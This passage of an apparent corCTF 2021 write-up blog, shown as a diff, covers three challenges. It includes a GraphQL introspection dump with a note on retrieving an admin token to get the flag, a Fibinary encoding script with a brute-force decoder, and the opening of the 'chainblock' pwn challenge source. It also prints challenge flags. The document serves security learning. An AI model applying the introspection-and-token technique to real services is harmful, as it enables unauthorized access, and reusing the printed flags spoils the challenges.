+                            "name": "subscriptionType",
+                            "description": "If this server support subscription, the type that subscription operations will be rooted at.",
+                            "args": [],
+                            "type": {
+                                "kind": "OBJECT",
+                                "name": "__Type",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "directives",
+                            "description": "A list of all directives supported by this server.",
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "LIST",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "OBJECT",
+                                            "name": "__Directive",
+                                            "ofType": null
+                                        }
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "__Type",
+                    "description": "The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.",
+                    "fields": [
+                        {
+                            "name": "kind",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "ENUM",
+                                    "name": "__TypeKind",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "name",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "description",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "specifiedByUrl",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "fields",
+                            "description": null,
+                            "args": [
+                                {
+                                    "name": "includeDeprecated",
+                                    "description": null,
+                                    "type": {
+                                        "kind": "SCALAR",
+                                        "name": "Boolean",
+                                        "ofType": null
+                                    },
+                                    "defaultValue": "false"
+                                }
+                            ],
+                            "type": {
+                                "kind": "LIST",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "NON_NULL",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "OBJECT",
+                                        "name": "__Field",
+                                        "ofType": null
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "interfaces",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "LIST",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "NON_NULL",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "OBJECT",
+                                        "name": "__Type",
+                                        "ofType": null
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "possibleTypes",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "LIST",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "NON_NULL",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "OBJECT",
+                                        "name": "__Type",
+                                        "ofType": null
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "enumValues",
+                            "description": null,
+                            "args": [
+                                {
+                                    "name": "includeDeprecated",
+                                    "description": null,
+                                    "type": {
+                                        "kind": "SCALAR",
+                                        "name": "Boolean",
+                                        "ofType": null
+                                    },
+                                    "defaultValue": "false"
+                                }
+                            ],
+                            "type": {
+                                "kind": "LIST",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "NON_NULL",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "OBJECT",
+                                        "name": "__EnumValue",
+                                        "ofType": null
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "inputFields",
+                            "description": null,
+                            "args": [
+                                {
+                                    "name": "includeDeprecated",
+                                    "description": null,
+                                    "type": {
+                                        "kind": "SCALAR",
+                                        "name": "Boolean",
+                                        "ofType": null
+                                    },
+                                    "defaultValue": "false"
+                                }
+                            ],
+                            "type": {
+                                "kind": "LIST",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "NON_NULL",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "OBJECT",
+                                        "name": "__InputValue",
+                                        "ofType": null
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "ofType",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "OBJECT",
+                                "name": "__Type",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "ENUM",
+                    "name": "__TypeKind",
+                    "description": "An enum describing what kind of type a given `__Type` is.",
+                    "fields": null,
+                    "inputFields": null,
+                    "interfaces": null,
+                    "enumValues": [
+                        {
+                            "name": "SCALAR",
+                            "description": "Indicates this type is a scalar.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "OBJECT",
+                            "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "INTERFACE",
+                            "description": "Indicates this type is an interface. `fields`, `interfaces`, and `possibleTypes` are valid fields.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "UNION",
+                            "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "ENUM",
+                            "description": "Indicates this type is an enum. `enumValues` is a valid field.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "INPUT_OBJECT",
+                            "description": "Indicates this type is an input object. `inputFields` is a valid field.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "LIST",
+                            "description": "Indicates this type is a list. `ofType` is a valid field.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "NON_NULL",
+                            "description": "Indicates this type is a non-null. `ofType` is a valid field.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "__Field",
+                    "description": "Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.",
+                    "fields": [
+                        {
+                            "name": "name",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "description",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "args",
+                            "description": null,
+                            "args": [
+                                {
+                                    "name": "includeDeprecated",
+                                    "description": null,
+                                    "type": {
+                                        "kind": "SCALAR",
+                                        "name": "Boolean",
+                                        "ofType": null
+                                    },
+                                    "defaultValue": "false"
+                                }
+                            ],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "LIST",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "OBJECT",
+                                            "name": "__InputValue",
+                                            "ofType": null
+                                        }
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "type",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "OBJECT",
+                                    "name": "__Type",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "isDeprecated",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "Boolean",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "deprecationReason",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "__InputValue",
+                    "description": "Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.",
+                    "fields": [
+                        {
+                            "name": "name",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "description",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "type",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "OBJECT",
+                                    "name": "__Type",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "defaultValue",
+                            "description": "A GraphQL-formatted string representing the default value for this input value.",
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "isDeprecated",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "Boolean",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "deprecationReason",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "__EnumValue",
+                    "description": "One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.",
+                    "fields": [
+                        {
+                            "name": "name",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "description",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "isDeprecated",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "Boolean",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "deprecationReason",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "__Directive",
+                    "description": "A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.",
+                    "fields": [
+                        {
+                            "name": "name",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "description",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "isRepeatable",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "Boolean",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "locations",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "LIST",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "ENUM",
+                                            "name": "__DirectiveLocation",
+                                            "ofType": null
+                                        }
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "args",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "LIST",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "OBJECT",
+                                            "name": "__InputValue",
+                                            "ofType": null
+                                        }
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "ENUM",
+                    "name": "__DirectiveLocation",
+                    "description": "A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.",
+                    "fields": null,
+                    "inputFields": null,
+                    "interfaces": null,
+                    "enumValues": [
+                        {
+                            "name": "QUERY",
+                            "description": "Location adjacent to a query operation.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "MUTATION",
+                            "description": "Location adjacent to a mutation operation.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "SUBSCRIPTION",
+                            "description": "Location adjacent to a subscription operation.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "FIELD",
+                            "description": "Location adjacent to a field.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "FRAGMENT_DEFINITION",
+                            "description": "Location adjacent to a fragment definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "FRAGMENT_SPREAD",
+                            "description": "Location adjacent to a fragment spread.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "INLINE_FRAGMENT",
+                            "description": "Location adjacent to an inline fragment.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "VARIABLE_DEFINITION",
+                            "description": "Location adjacent to a variable definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "SCHEMA",
+                            "description": "Location adjacent to a schema definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "SCALAR",
+                            "description": "Location adjacent to a scalar definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "OBJECT",
+                            "description": "Location adjacent to an object type definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "FIELD_DEFINITION",
+                            "description": "Location adjacent to a field definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "ARGUMENT_DEFINITION",
+                            "description": "Location adjacent to an argument definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "INTERFACE",
+                            "description": "Location adjacent to an interface definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "UNION",
+                            "description": "Location adjacent to a union definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "ENUM",
+                            "description": "Location adjacent to an enum definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "ENUM_VALUE",
+                            "description": "Location adjacent to an enum value definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "INPUT_OBJECT",
+                            "description": "Location adjacent to an input object type definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "INPUT_FIELD_DEFINITION",
+                            "description": "Location adjacent to an input object field definition.",
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "possibleTypes": null
+                }
+            ],
+            "directives": [
+                {
+                    "name": "include",
+                    "description": "Directs the executor to include this field or fragment only when the `if` argument is true.",
+                    "locations": [
+                        "FIELD",
+                        "FRAGMENT_SPREAD",
+                        "INLINE_FRAGMENT"
+                    ],
+                    "args": [
+                        {
+                            "name": "if",
+                            "description": "Included when true.",
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "Boolean",
+                                    "ofType": null
+                                }
+                            },
+                            "defaultValue": null
+                        }
+                    ]
+                },
+                {
+                    "name": "skip",
+                    "description": "Directs the executor to skip this field or fragment when the `if` argument is true.",
+                    "locations": [
+                        "FIELD",
+                        "FRAGMENT_SPREAD",
+                        "INLINE_FRAGMENT"
+                    ],
+                    "args": [
+                        {
+                            "name": "if",
+                            "description": "Skipped when true.",
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "Boolean",
+                                    "ofType": null
+                                }
+                            },
+                            "defaultValue": null
+                        }
+                    ]
+                },
+                {
+                    "name": "deprecated",
+                    "description": "Marks an element of a GraphQL schema as no longer supported.",
+                    "locations": [
+                        "FIELD_DEFINITION",
+                        "ARGUMENT_DEFINITION",
+                        "INPUT_FIELD_DEFINITION",
+                        "ENUM_VALUE"
+                    ],
+                    "args": [
+                        {
+                            "name": "reason",
+                            "description": "Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formatted using the Markdown syntax, as specified by [CommonMark](https://commonmark.org/).",
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "defaultValue": "\"No longer supported\""
+                        }
+                    ]
+                },
+                {
+                    "name": "specifiedBy",
+                    "description": "Exposes a URL that specifies the behaviour of this scalar.",
+                    "locations": [
+                        "SCALAR"
+                    ],
+                    "args": [
+                        {
+                            "name": "url",
+                            "description": "The URL that specifies the behaviour of this scalar.",
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "defaultValue": null
+                        }
+                    ]
+                }
+            ]
+        }
+    }
+}
+</code>
+</pre>
+</details>
+I'm not super familiar with graphql, but in my mind the nondefault queries roughly translated as a table users of User(username: String, token: String) and a function flag(token: String). Listing the users table showed an enormous number of what looked like hashes and an "admin" user at the top. Through trial and error I determined that the user tokens didn't get the flag, but the admin token would. The flag is corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}
+<h1 id="fibinary"><a href="/corctf-2021/fibinary">fibinary</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Warmup your crypto skills with the superior number system!
+</span></code></pre>
+<p>We're provided two files -- an encryption script in python and an encrypted flag.</p>
+<h2 id="enc-py">enc.py</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>fib </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>]
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">11</span><span>):
+</span><span>    fib</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(fib[i </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">+ </span><span>fib[i </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">2</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">c2f</span><span>(</span><span style="color:#ffcc66;">c</span><span>):
+</span><span>    n </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">ord</span><span>(c)
+</span><span>    b </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;&#39;
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>):
+</span><span>        </span><span style="color:#ffa759;">if </span><span>n </span><span style="color:#f29e74;">&gt;= </span><span>fib[i]:
+</span><span>            n </span><span style="color:#f29e74;">-= </span><span>fib[i]
+</span><span>            b </span><span style="color:#f29e74;">+= </span><span style="color:#bae67e;">&#39;1&#39;
+</span><span>        </span><span style="color:#ffa759;">else</span><span>:
+</span><span>            b </span><span style="color:#f29e74;">+= </span><span style="color:#bae67e;">&#39;0&#39;
+</span><span>    </span><span style="color:#ffa759;">return </span><span>b
+</span><span>flag </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&#39;flag.txt&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;r&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>()
+</span><span>enc </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;&#39;
+</span><span style="color:#ffa759;">for </span><span>c </span><span style="color:#ffa759;">in </span><span>flag:
+</span><span>    enc </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">c2f</span><span>(c) </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&#39; &#39;
+</span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&#39;flag.enc&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;w&#39;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
+</span><span>    f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(enc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">strip</span><span>())
+</span></code></pre>
+<h2 id="flag-enc">flag.enc</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100
+</span></code></pre>
+<p>Each character is "encrypted" individually which means it's looking awfully tractable. We can engage in a little wholesome brute force to crack each character individually.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>z3 </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>string </span><span style="color:#ffa759;">import </span><span>printable
+</span><span>fib </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span>]
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">11</span><span>):
+</span><span>    fib</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(fib[i </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">+ </span><span>fib[i </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">2</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">brute</span><span>(</span><span style="color:#ffcc66;">target</span><span>):
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">c2f</span><span>(</span><span style="color:#ffcc66;">c</span><span>):
+</span><span>        n </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">ord</span><span>(c)
+</span><span>        b </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;&#39;
+</span><span>        </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>):
+</span><span>            </span><span style="color:#ffa759;">if </span><span>n </span><span style="color:#f29e74;">&gt;= </span><span>fib[i]:
+</span><span>                n </span><span style="color:#f29e74;">-= </span><span>fib[i]
+</span><span>                b </span><span style="color:#f29e74;">+= </span><span style="color:#bae67e;">&#39;1&#39;
+</span><span>            </span><span style="color:#ffa759;">else</span><span>:
+</span><span>                b </span><span style="color:#f29e74;">+= </span><span style="color:#bae67e;">&#39;0&#39;
+</span><span>        </span><span style="color:#ffa759;">return </span><span>b
+</span><span>    </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span>printable:
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#ffd580;">c2f</span><span>(x) </span><span style="color:#f29e74;">== </span><span>target:
+</span><span>            </span><span style="color:#ffa759;">return </span><span>x
+</span><span>flag </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&#39;flag.enc&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;r&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span>)
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span>flag:
+</span><span>    char </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">brute</span><span>(i)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(char</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">end</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span></code></pre>
+<p>The flag is corctf{b4s3d_4nd_f1bp!113d}</p>
+<h1 id="chainblock"><a href="/corctf-2021/chainblock">chainblock</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I made a chain of blocks!
+</span><span>nc pwn.be.ax 5000
+</span></code></pre>
+<p>We're provided source, a binary, and ld/libc.</p>
+<h4 id="chainblock-c">chainblock.c</h4>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>##include </span><span style="color:#f29e74;">&lt;</span><span>stdio</span><span style="color:#f29e74;">.</span><span>h</span><span style="color:#f29e74;">&gt;
+</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> name </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Techlead&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">int</span><span> balance </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">100000000</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">verify</span><span>() {
